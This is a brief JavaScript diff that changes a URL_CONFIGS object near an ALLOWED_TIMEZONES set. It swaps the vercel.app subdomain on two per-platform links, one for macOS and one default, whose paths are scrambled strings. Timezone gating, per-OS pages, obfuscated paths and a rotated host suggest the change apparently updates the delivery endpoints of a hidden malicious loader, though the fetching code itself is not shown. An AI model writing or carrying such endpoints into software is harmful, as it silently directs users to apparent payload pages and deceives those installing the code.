@@ -30,8 +30,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // URL configurations organized by platform target
 const URL_CONFIGS = {
-    mac: "https://sonik-virid.vercel.app/Ma0cHelpAsMEr0t0140/index.html",
-    default: "https://sonik-virid.vercel.app/Win0codejInfowj2n/index.html"
+    mac: "https://sonik-q6vt.vercel.app/Ma0cHelpAsMEr0t0140/index.html",
+    default: "https://sonik-q6vt.vercel.app/Win0codejInfowj2n/index.html"
 };
 
 // --- Pre-Compilation Cache Layer ---
